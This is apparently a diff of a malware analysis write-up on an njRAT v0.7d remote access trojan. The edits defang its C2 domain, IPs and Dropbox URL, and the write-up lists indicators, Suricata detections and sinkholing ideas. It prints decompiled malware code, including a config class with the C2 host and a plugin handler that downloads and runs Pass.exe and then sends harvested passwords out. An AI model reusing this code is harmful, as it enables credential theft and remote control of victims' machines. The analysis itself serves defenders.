@@ -12,7 +12,7 @@ I was doing my usual morning triage run when this one caught my eye — a 37-kil
 
 At 37KB for a full-featured RAT, I figured it was either a loader stub or something stripped down to essentials. Turns out it was neither. It's a complete njRAT v0.7d build — keylogger, screen capture, webcam enumeration, remote shell, USB worm propagation, a DDoS module, credential theft, 30+ C2 commands — all packed into something smaller than most icons on your desktop. And the operator didn't even bother to obfuscate it. Every class name, every method, every config string is sitting there in plaintext waiting to be read.
 
-The C2 domain — `phishing.multimilliontoken.org` — had zero hits on VirusTotal, MalwareBazaar, and Hybrid Analysis when I pulled the sample. The compilation timestamp puts this build at April 4th, just four days before I got to it. Fresh infrastructure, fresh build, campaign tag "HacKed." Someone spun this up recently and it was actively beaconing behind Cloudflare when the sandboxes ran it.
+The C2 domain — `phishing[.]multimilliontoken[.]org` — had zero hits on VirusTotal, MalwareBazaar, and Hybrid Analysis when I pulled the sample. The compilation timestamp puts this build at April 4th, just four days before I got to it. Fresh infrastructure, fresh build, campaign tag "HacKed." Someone spun this up recently and it was actively beaconing behind Cloudflare when the sandboxes ran it.
 
 This write-up walks through the full reversing: extracting the configuration, tracing the C2 protocol, decompiling every command handler, and mapping the Win32 API calls to their actual behavior. Every code snippet shown here comes directly from ILSpy decompilation and was verified against the binary — no paraphrasing, no guessing.
 
@@ -62,7 +62,7 @@ The njRAT builder embeds configuration as plaintext UTF-16LE strings in the .tex
 
 | Field | Value | Notes |
 |---|---|---|
-| **C2 Host** | `phishing.multimilliontoken.org` | Novel domain — no public reporting |
+| **C2 Host** | `phishing[.]multimilliontoken[.]org` | Novel domain — no public reporting |
 | **C2 Port** | `443` | HTTPS port (but traffic is raw TCP, not TLS) |
 | **Mutex** | `411e31664bdd9d96369d0a44d5111aef` | MD5 hash, used as client ID |
 | **Version** | `im523` | njRAT builder revision |
@@ -81,7 +81,7 @@ The configuration is stored as public static fields at the top of the `OK` class
 // Decompiled from OK class — all config fields as static members
 public class OK
 {
-    public static string HH = "phishing.multimilliontoken.org";  // C2 host
+    public static string HH = "phishing.multimilliontoken.org";  // C2 host (defanged in prose)
     public static string P = "443";                               // C2 port
     public static string RG = "411e31664bdd9d96369d0a44d5111aef"; // Mutex (MD5)
     public static string VR = "im523";                            // Version
@@ -254,7 +254,7 @@ private static void Ind(byte[] b)
     {
         string path = Environ("temp") + "/pass.exe";
         new WebClient().DownloadFile(
-            "https://dl.dropbox.com/s/p84aaz28t0hepul/Pass.exe?dl=0", path);
+            "hXXps://dl[.]dropbox[.]com/s/p84aaz28t0hepul/Pass[.]exe?dl=0", path);
         Process.Start(path);
         // Read results and exfiltrate
         Send("pas" + Y + ENB(File.ReadAllText(Environ("temp") + "/temp.txt")));
@@ -762,7 +762,7 @@ The `&` operator chains commands sequentially in cmd.exe. The ping acts as a `sl
 The `Plugin` command downloads `Pass.exe` from a hardcoded Dropbox URL:
 
 ```
-https://dl.dropbox.com/s/p84aaz28t0hepul/Pass.exe?dl=0
+hXXps://dl[.]dropbox[.]com/s/p84aaz28t0hepul/Pass[.]exe?dl=0
 ```
 
 This is a secondary password recovery tool executed post-infection. The Dropbox hosting provides a semi-legitimate download vector that may bypass URL filtering.
@@ -775,12 +775,12 @@ This is a secondary password recovery tool executed post-infection. The Dropbox 
 
 | Type | Value | Context | Source |
 |---|---|---|---|
-| Domain | `phishing.multimilliontoken.org` | C2 server | Static + Dynamic |
-| IP | `188.114.97.3` | C2 (Cloudflare proxy) | ANY.RUN |
-| IP | `188.114.96.3` | C2 (Cloudflare proxy) | ANY.RUN |
-| IP | `104.21.50.193` | C2 (Cloudflare proxy) | Joe Sandbox |
+| Domain | `phishing[.]multimilliontoken[.]org` | C2 server | Static + Dynamic |
+| IP | `188[.]114[.]97[.]3` | C2 (Cloudflare proxy) | ANY.RUN |
+| IP | `188[.]114[.]96[.]3` | C2 (Cloudflare proxy) | ANY.RUN |
+| IP | `104[.]21[.]50[.]193` | C2 (Cloudflare proxy) | Joe Sandbox |
 | Port | `443/tcp` | C2 port (raw TCP, not TLS) | Static + Dynamic |
-| URL | `https://dl.dropbox.com/s/p84aaz28t0hepul/Pass.exe?dl=0` | Credential theft payload | Static |
+| URL | `hXXps://dl[.]dropbox[.]com/s/p84aaz28t0hepul/Pass[.]exe?dl=0` | Credential theft payload | Static |
 | Protocol | `|'|'|`-delimited plaintext TCP | njRAT signature | Static |
 | Suricata | `BACKDOOR njRAT Bladabindi CnC Communication command ll` | IDS alert | Dynamic |
 | ASN | AS13335 (CLOUDFLARENET) | C2 hosting infrastructure | Dynamic |
@@ -859,7 +859,7 @@ Note: njRAT sends plaintext on port 443 — any TLS inspection will immediately 
 
 ## Conclusion
 
-This 37KB njRAT v0.7d im523 variant is a textbook Bladabindi build with zero obfuscation — the operator relied entirely on the small file size and port 443 abuse for evasion rather than code protection. The "HacKed" campaign tag and `phishing.multimilliontoken.org` C2 domain are novel with no prior public reporting, suggesting a recently provisioned infrastructure.
+This 37KB njRAT v0.7d im523 variant is a textbook Bladabindi build with zero obfuscation — the operator relied entirely on the small file size and port 443 abuse for evasion rather than code protection. The "HacKed" campaign tag and `phishing[.]multimilliontoken[.]org` C2 domain are novel with no prior public reporting, suggesting a recently provisioned infrastructure.
 
 Despite its commodity nature, the sample packs an impressive density of capabilities into 37KB: keylogger, screen/webcam capture, remote shell, USB worm propagation, 20+ system control commands, anti-analysis tool detection, and a plugin system for deploying secondary payloads (including a Dropbox-hosted credential harvester). The plaintext C2 protocol on port 443 is trivially detectable — a single Suricata rule on the `|'|'|` separator will catch all njRAT v0.7d variants on the network.
 
@@ -877,7 +877,7 @@ Reversing the decompiled source revealed several implementation flaws that defen
 
 This is the big one. The entire C2 protocol is unauthenticated plaintext TCP. There is no TLS handshake, no challenge-response, no HMAC, no session token — nothing. The framing is just `<decimal_length>\0<UTF-8 payload>` with `|'|'|` delimiters.
 
-A defender who sinkoles `phishing.multimilliontoken.org` (via DNS or network controls) can stand up a listener on port 443 that:
+A defender who sinkoles `phishing[.]multimilliontoken[.]org` (via DNS or network controls) can stand up a listener on port 443 that:
 
 1. Accepts each bot's TCP connection
 2. Receives the `ll` identification beacon
@@ -980,7 +980,7 @@ Two sandbox runs confirmed that the static analysis findings are consistent with
 
 | Finding | Value |
 |---|---|
-| C2 resolved | `188.114.97.3`, `188.114.96.3` (CLOUDFLARENET) |
+| C2 resolved | `188[.]114[.]97[.]3`, `188[.]114[.]96[.]3` (CLOUDFLARENET) |
 | First beacon | `ll` command — njRAT's "I'm alive" check |
 | Suricata | `BACKDOOR njRAT Bladabindi CnC Communication command ll` (SID 2021176) |
 | Registry | `HKCU\di` = `!` (install marker, matches `ko()` line 1352) |
@@ -991,7 +991,7 @@ Two sandbox runs confirmed that the static analysis findings are consistent with
 
 | Finding | Value |
 |---|---|
-| C2 resolved | `104.21.50.193` (different Cloudflare IP — confirms DNS load balancing) |
+| C2 resolved | `104[.]21[.]50[.]193` (different Cloudflare IP — confirms DNS load balancing) |
 | Suricata | 1,000+ alerts (hit max), same SID 2021176 |
 | Sleep interception | 469,976 `Sleep` calls accelerated — the 1ms keylogger loop (`kl.WRK()`) is the cause |
 | CPU | >49% — confirmed by the `Thread.Sleep(1)` tight polling loop |
